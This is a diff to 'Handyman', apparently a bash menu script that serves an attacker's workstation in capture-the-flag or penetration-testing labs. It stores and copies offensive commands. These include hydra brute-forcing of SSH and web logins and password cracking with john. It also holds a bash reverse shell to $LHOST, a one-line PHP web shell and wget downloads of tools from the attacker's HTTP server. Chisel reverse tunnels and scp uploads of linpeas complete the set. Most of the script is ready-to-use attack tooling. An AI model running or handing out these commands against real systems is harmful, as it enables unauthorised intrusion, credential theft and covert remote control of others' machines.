@@ -19,10 +19,12 @@ LIGHTCYAN='\033[1;36m'
 WHITE='\033[1;37m'
 
 LHOST=10.9.233.39
-RHOST=
+RHOST=$RHOST
 EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
 
-COMMAND_2='sudo vim /etc/hosts'
+COMMAND_2='Serve tools'
+COMMAND_3='Upload handyman'
+COMMAND_4='sudo vim /etc/hosts'
 
 COMMAND_e1='nmap -sV -sC $RHOST | highlight "^\d+\/tcp"'
 COMMAND_e2='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
@@ -32,7 +34,6 @@ COMMAND_e4='whatweb -v $RHOST'
 COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
 COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
 COMMAND_7='ssh $USER@$RHOST -p 22'
-COMMAND_8='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
 COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
 COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
 COMMAND_b='binwalk -e file.jpg'
@@ -41,23 +42,28 @@ COMMAND_d='7z x file.zip'
 COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
 COMMAND_f='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
 COMMAND_g='nc -nlvp 4444'
-COMMAND_h='scp ~/Tools/handyman.sh $USER@$RHOST:/tmp'
+COMMAND_h='chisel server -p 9999 --reverse -v'
 
-CLIP_1="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
-CLIP_2="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
-CLIP_3="export TERM=xterm"
-CLIP_4="stty raw -echo; fg"
-CLIP_5='ss -tunl'
-CLIP_6='<?php system($_GET["c"]); ?>'
+COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
+COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
+
+CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+CLIP_2="export TERM=xterm"
+CLIP_3="stty raw -echo; fg"
+CLIP_4='<?php system($_GET["c"]); ?>'
+CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
+CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
+CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
+CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
 
 show_menus() {
   clear
   echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-  echo -e " ${ORANGE}$LHOST${NOCOLOR} - Handyman - ${RED}$RHOST${NOCOLOR}"
+  echo -e "                 ${ORANGE}$LHOST${NOCOLOR} - Handyman - ${RED}$RHOST${NOCOLOR}"
   echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
   echo -e "  ${LIGHTGREEN}Setup${NOCOLOR}"
   echo -e "  ------"
-  echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (RHOST)"
+  echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (${YELLOW}R${NOCOLOR}HOST)"
   echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
@@ -81,6 +87,11 @@ show_menus() {
   echo -e "  ${YELLOW}g${NOCOLOR}) $COMMAND_g"
   echo -e "  ${YELLOW}h${NOCOLOR}) $COMMAND_h"
   echo -e ""
+  echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
+  echo -e "  ------"
+  echo -e "  ${YELLOW}u1${NOCOLOR}) $COMMAND_u1"
+  echo -e "  ${YELLOW}u2${NOCOLOR}) $COMMAND_u2"
+  echo -e ""
   echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
   echo -e "  -----"
   echo -e "  http://$RHOST/robots.txt"
@@ -94,6 +105,8 @@ show_menus() {
   echo -e "  ${YELLOW}c4${NOCOLOR}) $CLIP_4"
   echo -e "  ${YELLOW}c5${NOCOLOR}) $CLIP_5"
   echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
+  echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
+  echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
   echo -e ""
   echo -e "  e(${RED}x${NOCOLOR})it. Exit"
   echo -e ""
@@ -102,15 +115,64 @@ show_menus() {
 exportRHOST() {
   RHOST=$(xclip -o)
 
-  tmux split-window -v
-  sleep 0.1
+  if [[ $RHOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    export RHOST=$RHOST
 
-  tmux send-keys "export X=$RHOST" 'C-m'
-  tmux kill-pane -t 0
+    tmux split-window -v
+    sleep 0.1
+
+    tmux send-keys "export RHOST=$RHOST" 'C-m'
+    tmux kill-pane -t 0
+  else
+    tmux split-window -v
+    sleep 0.1
+
+    tmux send-keys "export RHOST="
+  fi
 }
 
 exportLHOST() {
-  export LHOST=$1
+  if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    export LHOST=$1
+  fi
+}
+
+runServeTools() {
+  tmux setenv LHOST $LHOST
+  tmux setenv RHOST $RHOST
+  tmux setenv USER $USER
+
+  tmux split-window -v
+  sleep 0.1
+
+  # Setup handyman with correct LHOST
+  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" 'C-m'
+  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' 'C-m'
+  tmux send-keys 'cd ~/Tools' 'C-m'
+  
+  # Serve the Tools/ folder
+  if [ ! command -v python3 &> /dev/null ]; then
+    tmux send-keys "python -m SimpleHTTPServer" 'C-m'
+  else
+    tmux send-keys "python3 -m http.server" 'C-m'
+  fi
+}
+
+runUploadHandyman() {
+  tmux setenv LHOST $LHOST
+  tmux setenv RHOST $RHOST
+  tmux setenv USER $USER
+
+  tmux split-window -v
+  sleep 0.1
+
+  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" 'C-m'
+  sleep 0.1
+
+  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' 'C-m'
+  sleep 0.1
+
+  tmux send-keys "scp ~/Tools/handyman_cp $USER@$RHOST:/tmp/handyman"
 }
 
 runV() {
@@ -130,12 +192,22 @@ runC() {
   echo "COPIED!"
 }
 
+runExit() {
+  exit 0
+}
+
 read_options() {
   local choice
   read -p "Enter choice: " choice
   case $choice in
     1) exportRHOST;;
-    2) runV $COMMAND_2;;
+    R) exportRHOST;;
+
+    2) runServeTools;;
+
+    3) runUploadHandyman;;
+
+    4) runV $COMMAND_4;;
 
     e1) runV $COMMAND_e1;;
     e2) runV $COMMAND_e2;;
@@ -156,15 +228,20 @@ read_options() {
     g) runV $COMMAND_g;;
     h) runV $COMMAND_h;;
 
+    u1) runV $COMMAND_u1;;
+    u2) runV $COMMAND_u2;;
+
     c1) runC $CLIP_1;;
     c2) runC $CLIP_2;;
     c3) runC $CLIP_3;;
     c4) runC $CLIP_4;;
     c5) runC $CLIP_5;;
     c6) runC $CLIP_6;;
+    c7) runC $CLIP_7;;
+    c8) runC $CLIP_8;;
 
-    x) exit 0;;
-    exit) exit 0;;
+    x) runExit;;
+    exit) runExit;;
   esac
 }
 
